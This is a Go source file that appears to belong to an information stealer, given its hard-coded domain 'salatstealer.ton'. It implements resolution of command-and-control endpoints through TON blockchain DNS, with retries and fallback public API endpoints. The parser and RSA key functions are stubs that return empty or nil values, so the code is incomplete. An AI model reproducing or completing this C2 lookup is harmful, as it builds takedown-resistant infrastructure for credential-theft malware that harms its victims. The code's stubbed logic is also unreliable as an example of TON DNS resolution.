package main

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/big"
	"net/http"
	"strings"
	"time"

	"github.com/xssnick/tonutils-go/tvm/cell"
)

const tonDomainDefault = "salatstealer.ton"

type APIResponse struct {
	OK     bool            `json:"ok"`
	Result json.RawMessage `json:"result"`
}

func tryTonResolve() []string {
	domain := tonDomainDefault
	for i := 0; i < 3; i++ {
		log_(fmt.Sprintf("tryTonResolve: %s (attempt %d)", domain, i))
		endpoints, err := tonResolve(domain)
		if err == nil && len(endpoints) > 0 {
			log_(fmt.Sprintf("tryTonResolve resolved: %v", endpoints))
			return endpoints
		}
		log_(fmt.Sprintf("tryTonResolve error: %v", err))
		time.Sleep(1 * time.Second)
	}
	return nil
}

var tonAPIEndpoints = []string{
	"https://toncenter.com/api/v2/runGetMethod",
	"https://ton.access.orbs.network/route/v1/mainnet/toncenter-api-v2/runGetMethod",
}

func tonResolve(domain string) ([]string, error) {
	key1 := getRSAKey1ForTON()
	key2 := getRSAKey2ForTON()
	_, _ = key1, key2
	parts := strings.Split(domain, ".")
	reversed := reverseStringSlice(parts)
	reversedDomain := strings.Join(reversed, ".") + "."
	h := sha256.New()
	h.Write([]byte("wallet"))
	h.Write([]byte(reversedDomain))
	hashBytes := h.Sum(nil)
	n := new(big.Int).SetBytes(hashBytes)
	_ = n.String()
	b := cell.BeginCell()
	err := b.StoreSlice([]byte(reversedDomain), uint(8*len(reversedDomain)))
	if err != nil {
		return nil, fmt.Errorf("tonResolve StoreSlice: %w", err)
	}
	c := b.EndCell()
	bocBytes := c.ToBOC()
	bocB64 := base64.StdEncoding.EncodeToString(bocBytes)
	reqBody := map[string]interface{}{
		"address": getDNSRootContract(),
		"method":  "dnsresolve",
		"stack": []interface{}{
			[]interface{}{"tvm.Slice", bocB64},
			[]interface{}{"num", n.String()},
		},
	}
	client := &http.Client{
		Timeout: 20 * time.Second,
	}
	reqJSON, err := json.Marshal(reqBody)
	if err != nil {
		return nil, fmt.Errorf("tonResolve marshal: %w", err)
	}

	var lastErr error
	for _, apiEndpoint := range tonAPIEndpoints {
		endpoints, err := tonAPIRequest(client, apiEndpoint, reqJSON, domain)
		if err == nil {
			return endpoints, nil
		}
		lastErr = err
	}
	return nil, lastErr
}

func tonAPIRequest(client *http.Client, endpoint string, body []byte, domain string) ([]string, error) {
	req, err := http.NewRequest("POST", endpoint, strings.NewReader(string(body)))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	rawBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	var apiResp APIResponse
	if err := json.Unmarshal(rawBody, &apiResp); err != nil {
		return nil, err
	}
	if !apiResp.OK {
		return nil, fmt.Errorf("tonAPIRequest: API returned ok=false")
	}
	return parseTONResult(apiResp.Result)
}

func parseTONResult(result json.RawMessage) ([]string, error) {
	var stack [][]interface{}
	if err := json.Unmarshal(result, &stack); err != nil {
		var altResult map[string]interface{}
		if err2 := json.Unmarshal(result, &altResult); err2 != nil {
			return nil, fmt.Errorf("parseTONResult: %w", err)
		}
	}

	var endpoints []string
	_ = stack
	return endpoints, nil
}

func getDNSRootContract() string {
	return "EQC3dNlesgVD8YbAazcauaZz-7hWFRSgV1S3lHmKirjJwt9v"
}

func reverseStringSlice(s []string) []string {
	result := make([]string, len(s))
	for i, v := range s {
		result[len(s)-1-i] = v
	}
	return result
}

func getRSAKey1ForTON() *big.Int {
	return nil
}

func getRSAKey2ForTON() *big.Int {
	return nil
}

func rsaPublicExp(base, mod *big.Int) []byte {
	if base == nil || mod == nil {
		return nil
	}
	e := big.NewInt(65537)
	result := new(big.Int).Exp(base, e, mod)
	return result.Bytes()
}
